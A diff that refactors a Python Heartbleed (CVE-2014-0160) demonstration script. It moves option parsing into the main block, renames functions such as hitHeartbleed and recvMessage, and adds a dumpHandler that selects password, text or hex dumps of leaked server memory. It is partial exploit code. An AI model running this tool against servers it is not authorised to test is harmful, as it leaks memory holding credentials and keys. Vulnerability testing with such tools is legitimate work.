@@ -14,13 +14,6 @@ import logging
 from optparse import OptionParser
 
 decode_hex = codecs.getdecoder('hex_codec')
-
-options = OptionParser(usage='%prog server [options]', description='Demo of heartbleed(CVE-2014-0160)')
-options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
-options.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
-options.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
-opts, args = options.parse_args()
-
 def h2bin(x):
 	return decode_hex(x.replace(' ', '').replace('\n', '').replace('\t', ''))[0]
 
@@ -65,14 +58,9 @@ def passdump(s):
 		print(buf[left:])
 
 def dump(s):
-	if opts.output == 'password':
-		passdump(s)
-	elif opts.output == 'text':
-		textdump(s)
-	elif opts.output == 'hex':
-		hexdump(s)
+	dumpHandler(s)
 
-def recvall(s, length, timeout=5):
+def recvAll(s, length, timeout=5):
 	endtime = time.time() + timeout
 	rdata = b''
 	remain = length
@@ -90,23 +78,23 @@ def recvall(s, length, timeout=5):
 
 	return rdata
 
-def recvmsg(s):
-	hdr = recvall(s, 5)
+def recvMessage(s):
+	hdr = recvAll(s, 5)
 	if hdr is None:
 		logging.warning('Unexpected EOF receiving record header - server closed connection')
 		return None, None, None
 	typ, ver, ln = struct.unpack('>BHH', hdr)
-	pay = recvall(s, ln, 10)
+	pay = recvAll(s, ln, 10)
 	if pay is None:
 		logging.warning('Unexpected EOF receiving record payload - server closed connection')
 		return None, None, None
 	logging.info(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
 	return typ, ver, pay
 
-def hit_hb(s):
+def hitHeartbleed(s):
 	s.send(hb)
 	while True:
-		typ, ver, pay = recvmsg(s)
+		typ, ver, pay = recvMessage(s)
 
 		if typ is None:
 			logging.error('No heartbeat response received, server likely not vulnerable')
@@ -139,7 +127,7 @@ def main(host, port):
 	logging.info('Waiting for Server Hello...')
 
 	while True:
-		typ, ver, pay = recvmsg(s)
+		typ, ver, pay = recvMessage(s)
 		if typ == None:
 			logging.error('Server closed connection without sending Server Hello.')
 			return
@@ -149,15 +137,27 @@ def main(host, port):
 
 	logging.info('Sending heartbeat request...')
 	s.send(hb)
-	hit_hb(s)
+	hitHeartbleed(s)
 
 if __name__ == '__main__':
+	options = OptionParser(usage='%prog server [options]', description='Demo of heartbleed(CVE-2014-0160)')
+	options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
+	options.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
+	options.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
+
+	opts, args = options.parse_args()
+
 	if len(args) < 1:
 		options.print_help()
 	else:
 		if opts.output == 'password':
+			dumpHandler = passdump
 			logging.basicConfig(level=logging.CRITICAL)
-		else:
+		elif opts.output == 'text':
+			dumpHandler = textdump
+			logging.basicConfig(level=logging.INFO)
+		elif opts.output == 'hex':
+			dumpHandler = hexdump
 			logging.basicConfig(level=logging.INFO)
 
 		if opts.loop:
